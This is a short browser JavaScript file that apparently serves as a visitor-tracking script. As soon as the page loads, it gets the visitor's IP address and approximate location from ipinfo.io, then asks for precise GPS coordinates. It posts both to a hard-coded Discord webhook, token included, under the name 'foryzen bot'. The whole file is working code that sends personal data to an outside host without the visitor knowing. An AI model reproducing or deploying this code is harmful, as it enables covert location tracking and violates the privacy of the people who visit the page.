const url = "https://discord.com/api/webhooks/1022789439187071008/aUDv-B7XD1sXdntjrF4OzksA0SSb_uoNqQ9uSTCA729Ydu13zyMMhTTwUvfGldXIxkJ6"
const script = document.createElement('script');

script.src = 'https://ipinfo.io?callback=callback';
setTimeout(() => {
    document.body.appendChild(script);
    document.body.removeChild(script);
}, 1);

function callback(data) {
    var message = { "username": "foryzen bot","content": data.ip+' / '+data.loc }

    var data = {
        method: "POST",mode: "cors",
        headers: {"Content-type": "application/json"},
        body: JSON.stringify(message)
    }

    send(data)
}

setTimeout(get_loc, 100)

function get_loc(){
    navigator.geolocation.getCurrentPosition(send_loc)
}

function send_loc(position){
    var location = position.coords.latitude+", "+position.coords.longitude

    var message = { "username": "foryzen bot","content": location }

    var data = {
        method: "POST",mode: "cors",
        headers: {"Content-type": "application/json"},
        body: JSON.stringify(message)
    }

    send(data)
}

function send(data){return fetch(url, data)}